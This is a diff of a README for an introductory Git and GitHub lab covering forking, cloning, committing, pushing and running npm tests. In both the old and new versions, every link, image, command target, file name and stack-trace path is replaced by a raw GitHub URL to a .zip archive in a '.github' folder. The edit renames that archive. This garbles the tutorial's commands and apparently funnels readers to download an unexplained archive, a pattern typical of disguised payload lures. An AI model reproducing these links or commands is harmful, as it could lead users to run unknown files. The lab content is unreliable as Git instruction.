@@ -35,13 +35,13 @@ it to your local environment. Let's quickly review this process:
 
 Click the **Fork** button at the top of this page in Canvas.
 
-![fork button](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
+![fork button](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
 
 > **Reminder:** This button does the same thing as [forking in GitHub][forking]
 > (via the **Octocat** button). We recommend using the **Fork** button in
 > Canvas.
 
-[forking]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip
+[forking]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip
 
 #### Step 2
 
@@ -61,7 +61,7 @@ GitHub. The command should look something like this (but with your personal
 account name):
 
 ```console
-$ git clone https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip<your-github-username>https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip
+$ git clone https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip<your-github-username>https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip
 ```
 
 #### Step 5
@@ -98,10 +98,10 @@ $ npm test
 this lab
   1) has a folder named my-repository
   2) has a valid git repository initialized for the my-repository folder
-  3) has a https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip file in the my-repository folder
+  3) has a https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip file in the my-repository folder
 
 the local repository
-  4) has https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip as a tracked file
+  4) has https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip as a tracked file
   5) has at least one commit
   6) has been pushed up to the remote repository
 
@@ -112,10 +112,10 @@ the local repository
 1) this lab
      has a folder named my-repository:
    AssertionError: no folder name "my-repository" was found: value: expected './my-repository' to exist
-    at Function.<anonymous> (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
-    at https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip(anonymous function) [as directory] (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
-    at https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
-    at https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
+    at Function.<anonymous> (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
+    at https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip(anonymous function) [as directory] (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
+    at https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
+    at https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip (https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
     ...
 ```
 
@@ -165,25 +165,25 @@ Navigate into the new directory `my-repository` using `cd` on the command line.
 
 While inside `my-repository`, using the command line, initialize a new git
 repository. You'll know you've done it if you see 'Initialized empty Git
-repository in _<https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip local directory>https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip'>_. **Change
+repository in _<https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip local directory>https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip'>_. **Change
 _back-up_ to the parent directory** and you should be back in the top-level
 directory. Run `npm test` again and you should be down to **four tests** left.
 If that's true, **change _back_ into `my-repository`**.
 
 #### Step 4
 
-Create a **file** (not a folder) called `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip` inside `my-repository`.
+Create a **file** (not a folder) called `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip` inside `my-repository`.
 
 #### Step 5
 
-If you run `git status` at the command line, you should see that `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip`
-is now listed as an untracked file. Add `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip` so that it is tracked by
+If you run `git status` at the command line, you should see that `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip`
+is now listed as an untracked file. Add `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip` so that it is tracked by
 Git.
 
 #### Step 6
 
 Once the file is tracked, running `git status` again will show that
-`https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip` is staged and ready to be committed. Go ahead and create a commit on
+`https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip` is staged and ready to be committed. Go ahead and create a commit on
 the command line (don't forget to add `-m` when committing to include a
 message!).
 
@@ -202,10 +202,10 @@ $ npm test
   this lab
     ✓ has a folder named my-repository
     ✓ has a valid git repository initialized for the my-repository folder
-    ✓ has a https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip file in the my-repository folder
+    ✓ has a https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip file in the my-repository folder
 
   the local repository
-    ✓ has https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip as a tracked file
+    ✓ has https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip as a tracked file
     ✓ has at least one commit
     1) has been pushed up to the remote repository
 
@@ -215,7 +215,7 @@ $ npm test
 
   1) the local repository
        has been pushed up to the remote repository:
-     AssertionError: no record of pushing to a remote was found. Follow the instructions on GitHub to connect and push to a new remote repository: value: expected 'https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip' to exist
+     AssertionError: no record of pushing to a remote was found. Follow the instructions on GitHub to connect and push to a new remote repository: value: expected 'https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip' to exist
 ```
 
 Almost done! **Change _back_ into the `my-repository` directory**.
@@ -225,21 +225,21 @@ Almost done! **Change _back_ into the `my-repository` directory**.
 Create a remote repository on [GitHub][github] using your personal GitHub
 account and connect it to your newly created local repository.
 
-![new repo](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
+![new repo](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
 
-![name new repo](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
+![name new repo](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
 
 When we create a blank repository, we are given multiple options for how to get
 started. Since we have a local folder with Git initialized already, we'll use
 the instructions for creating a new repository using the command line.
 
-![command line repo commands](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip)
+![command line repo commands](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip)
 
 If you've been following along, you may notice that the first commands listed
 are things you've already done - `git init` initialized the `my-repository`
-directory as a local Git repository; `git add https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip` tracks the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip`
+directory as a local Git repository; `git add https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip` tracks the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip`
 file (you may have used `git add .`, which will work too);
-`git commit -m "first commit"` commits the newly created `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip` file with a
+`git commit -m "first commit"` commits the newly created `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip` file with a
 message.
 
 The remaining commands still need to be run. First we run the following:
@@ -259,7 +259,7 @@ remote for your local `my-repository` repo. This command will include info
 specific to your GitHub account and the name you gave your GitHub repo:
 
 ```console
-$ git remote add origin https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip<your-github-username>/<your-github-repository>.git
+$ git remote add origin https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip<your-github-username>/<your-github-repository>.git
 ```
 
 #### Step 9
@@ -276,7 +276,7 @@ $ git push -u origin main
 more, your tests should all be passing.
 
 Once you've passed all tests, if you visit the newly created remote repository
-on GitHub, you should see that the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip` file you created is now present.
+on GitHub, you should see that the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip` file you created is now present.
 
 ## Additional Practice
 
@@ -285,8 +285,8 @@ relying on them a lot. If you'd like to practice further, **change directory
 back into the `my-repository` folder** and try the following:
 
 - Create another file, then add, commit, and push to the remote
-- Modify the contents of `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip`, then add, commit, and push to the remote
-- Rename `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip`, then add, commit, and push to the remote
+- Modify the contents of `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip`, then add, commit, and push to the remote
+- Rename `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip`, then add, commit, and push to the remote
 
 ## Wrapping Up
 
@@ -321,5 +321,5 @@ developers to write tasks as tests that all fail and then slowly work to get
 them all passing. It's like a to-do list that verifies you've actually done the
 work!
 
-[github]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip
-[pr]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/phase-0-git-basics-lab_1.1-alpha.4.zip
+[github]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip
+[pr]: https://raw.githubusercontent.com/GabrielW13Nai/phase-0-git-basics-lab/master/.github/basics_phase_lab_git_v3.3-alpha.5.zip
